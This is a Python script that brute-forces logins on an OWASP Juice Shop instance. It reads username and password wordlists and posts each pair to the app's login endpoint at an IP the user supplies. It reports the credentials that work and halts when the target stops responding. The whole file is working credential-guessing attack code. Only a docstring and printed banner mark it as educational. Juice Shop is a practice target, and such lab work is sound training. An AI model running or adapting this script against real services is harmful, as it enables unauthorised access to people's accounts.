#!/usr/bin/env python3
"""
Juice Shop Brute Force Script

This script attempts to find valid credentials for a Juice Shop instance by
brute-forcing a list of usernames and passwords.

For educational purposes only.
"""

import os
import time

# "requests" is optional in some environments (editor/CI without deps).
# Keep a runtime ImportError guard so the module can be imported by linters
# or tests that don't have requests installed. Silence pylint and Pylance
# diagnostics for the import; runtime behavior still checks and reports.
try:
    import requests  # pylint: disable=import-error  # type: ignore[reportMissingModuleSource]
except ImportError:  # pragma: no cover - environment may not have requests installed
    requests = None

def load_wordlist(filename):
    """Load usernames or passwords from a file."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    wordlist_path = os.path.join(script_dir, "lists", filename)
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Could not find {filename}")
        return []

def attempt_login(target_ip, username, password, timeout=5):
    """
    Try to login with a given username and password.
    Returns a tuple of (success, status_string).
    """
    login_url = f"http://{target_ip}:3000/rest/user/login"
    payload = {"email": username, "password": password}
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(login_url, json=payload, headers=headers, timeout=timeout)

        if response.status_code == 200:
            response_data = response.json()
            if "authentication" in response_data and "token" in response_data["authentication"]:
                return True, "success"

        return False, "failed"
    except requests.exceptions.Timeout:
        return False, "timeout"
    except requests.exceptions.ConnectionError:
        return False, "connection_error"
    except requests.exceptions.RequestException as e:
        print(f"An unexpected error occurred: {e}")
        return False, "error"

def main():
    """Main function to run the brute force script."""
    print("Juice Shop Brute Force Script")
    print("Educational use only!")
    print("")

    if requests is None:
        print("The 'requests' library is not installed.")
        print("Install it to run this script: pip install requests")
        return

    target_ip = input("What is the IP of the Juice Shop Machine? ")

    print(f"Testing connection to {target_ip}:3000...")
    try:
        requests.get(f"http://{target_ip}:3000", timeout=5)
        print("Connection successful!")
    except requests.exceptions.RequestException:
        print("Cannot reach target. Make sure Juice Shop is running.")
        return

    print("Loading wordlists...")
    usernames = load_wordlist("users.txt")
    passwords = load_wordlist("passwords.txt")

    if not usernames or not passwords:
        print("Error loading wordlists. Check that users.txt and passwords.txt exist.")
        return

    print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")
    print("Starting brute force attack...\n")

    found_credentials = run_bruteforce(target_ip, usernames, passwords)

    print("\n=== Results ===")
    if found_credentials:
        print(f"Found {len(found_credentials)} valid login(s):")
        for cred_user, cred_pass in found_credentials:
            print(f"  {cred_user}:{cred_pass}")
    else:
        print("No valid credentials found.")

    print("Attack finished.")


def run_bruteforce(target_ip, usernames, passwords, timeout=5, max_consecutive_failures=3):
    """Perform the brute-force attempts and return any found credentials.

    This extracts the nested loop from main to reduce complexity and keep
    local variables scoped to this function.
    """
    found_credentials = []
    attempt = 0
    total = len(usernames) * len(passwords)
    consecutive_failures = 0

    for username in usernames:
        for password in passwords:
            attempt += 1
            print(f"[{attempt}/{total}] Trying {username}:{password}...", end=" ", flush=True)

            start_time = time.time()
            success, status = attempt_login(target_ip, username, password, timeout=timeout)
            elapsed_time = time.time() - start_time

            if success:
                print(f"SUCCESS! ({elapsed_time:.1f}s)")
                print(f"Found valid login: {username}:{password}")
                found_credentials.append((username, password))
                consecutive_failures = 0

                if input("Continue searching? (y/n): ").lower() != 'y':
                    return found_credentials
            elif status in ("timeout", "connection_error"):
                consecutive_failures += 1
                print(f"{status.upper()} ({elapsed_time:.1f}s)")
                if consecutive_failures >= max_consecutive_failures:
                    print("\n" + "=" * 50)
                    print("HOST NO LONGER AVAILABLE")
                    print("Multiple consecutive timeouts/errors detected.")
                    print("The target may have blocked this IP or gone offline.")
                    print("=" * 50)
                    return found_credentials
            else:  # 'failed' or 'error'
                print(f"FAILED ({elapsed_time:.1f}s)")
                consecutive_failures = 0

            time.sleep(0.1)

    return found_credentials

if __name__ == "__main__":
    main()
